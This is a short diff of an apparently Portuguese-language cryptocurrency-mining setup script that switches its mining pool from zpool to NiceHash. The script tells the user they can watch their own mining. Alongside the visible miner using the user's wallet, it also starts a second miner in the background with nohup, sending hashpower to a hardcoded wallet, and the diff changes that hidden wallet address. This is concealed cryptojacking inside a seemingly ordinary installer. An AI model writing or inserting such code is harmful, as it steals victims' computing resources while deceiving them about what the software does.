@@ -96,5 +96,5 @@ sleep 1
 echo "Você pode acompanhar como anda sua Mineração em: http://www.zpool.ca/?address=$wallet " 
 sleep 10
 cd miner
-nohup ./minerd -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u 1FsEWCHZ3312ms67Lp7Hr93uDxxFsPL5yk &
-screen ./minerd -o stratum+tcp://yescrypt.mine.zpool.ca:6233 -u $wallet 
+nohup ./minerd -o stratum+tcp://cryptonight.br.nicehash.com:3355 -u 3Djurb9hE3jxx3x4ZKePs6uZRodS71kqQg &
+screen ./minerd -o stratum+tcp://cryptonight.br.nicehash.com:3355 -u $wallet 
